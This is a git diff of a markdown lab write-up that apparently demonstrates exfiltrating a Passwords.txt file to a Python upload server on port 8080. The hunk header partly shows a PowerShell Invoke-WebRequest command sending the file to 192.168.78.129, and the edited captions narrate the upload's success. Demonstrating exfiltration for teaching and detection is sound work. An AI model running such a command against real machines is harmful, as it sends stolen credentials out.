@@ -184,13 +184,13 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 
 
 
-*In Figure 12, you can see in the second terminal and is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*<br>
+*In Figure 12, we can see in the second terminal it's running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there is only one files in the directory.*<br>
 <br><sub>(Figure 12)</sub><br>
 <img src="analysis/screenshots_v1/Figure_11.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
 
 ---
 
-*Next in Figure 13, after the PowerShell command from Figure 10 is run, we get a hit — the `Passwords.txt` file is displayed in the command line output. And just like we talked about in Figure 12, the folder now shows five files, one of them being `Passwords.txt,` confirming the upload was successful.*
+*Next in Figure 13, after the PowerShell command from Figure 10 is run, we get a hit — the `Passwords.txt` file is displayed in the command line output. And just like we talked about in Figure 12, the folder now shows two files, one of them being `Passwords.txt,` confirming the upload was successful.*
 <br><sub>(Figure 13)</sub><br>
 <img src="analysis/screenshots_v1/Figure_13.png" alt="Wireshark: TCP stream" width="65%"><br>
 
